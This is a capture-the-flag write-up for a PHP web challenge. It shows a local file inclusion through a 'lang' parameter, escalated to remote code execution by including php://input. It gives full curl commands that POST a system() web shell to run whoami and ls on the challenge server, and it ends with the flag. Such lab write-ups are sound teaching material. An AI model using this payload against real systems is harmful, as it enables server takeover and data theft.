# Streamlined Democracy - web

## Challenge

Before you begin your voting, review our online guide and reach out if you have any questions. Your input is very important to us!

## Solve

Viewing the webpage provided we can see there is an option to toggle language in the top right corner:

<img width="902" height="569" alt="s1" src="https://github.com/user-attachments/assets/d1817fd6-705c-4a15-ade2-e886133bc3f7" />


When we select French, a `lang` parameter appears in the URL and is set to `fr.php`. It turns out path traversal is possible using this parameter:

<img width="915" height="506" alt="streamlined" src="https://github.com/user-attachments/assets/674850f5-d513-46c3-9a87-4bd343f8c117" />


After much exploring of the filesystem, it appears that we aren't going to be able to find the flag by checking usual locations with generic flag names like `flag.txt`, `flag.php`, `flag` etc. Doing some research led to [this article](https://medium.com/@zoningxtr/from-lfi-to-rce-via-php-input-the-complete-beginner-friendly-guide-e38e79924521) - if getting RCE is possible, we would be able to more effectively explore the filesystem. The use of the PHP I/O stream `input://` strongly aligned with the challenge name and description and we could soon get a solve:

- First confirm we can execute commands with:
  
```bash
curl -X POST -d "<?php system($_GET['cmd']); ?>" \
"http://3.105.27.130:8001/?lang=php://input&cmd=whoami"
```

- `php://input` directs the application to read the raw body of a POST request as a stream. When combined with `include()` in the source - 
    ```php
    $lang = include($language);
    ```
    POST data can be executed as code.
- We send the POST request with the data as PHP code: `"<?php system($_GET['cmd']); ?>"`
  - php `system()` runs local shell commands on the web server
- Then set the `cmd` parameter to whatever we like in the query string

<img width="468" height="85" alt="sd" src="https://github.com/user-attachments/assets/fc27b3d3-8d70-41dc-8a0c-c0cbd7c41a21" />


- Then find the location of the flag with:

```bash
curl -X POST -d '<?php system($_GET["cmd"]); ?>' \
"http://3.105.27.130:8001/?lang=php://input&cmd=ls+/"
```

<img width="459" height="132" alt="sd2" src="https://github.com/user-attachments/assets/53f5855a-744f-4d2d-a331-58ab50ab7be0" />


- Then read the flag directly in browser with `lang=/MXypSYzPptJ3_flag.txt`:

<img width="624" height="111" alt="sd3" src="https://github.com/user-attachments/assets/055592d5-dd8b-452b-9a75-23df52403925" />


`secedu{pHp_wr@Pp3rs_w1LL_n3veR_d!e}`
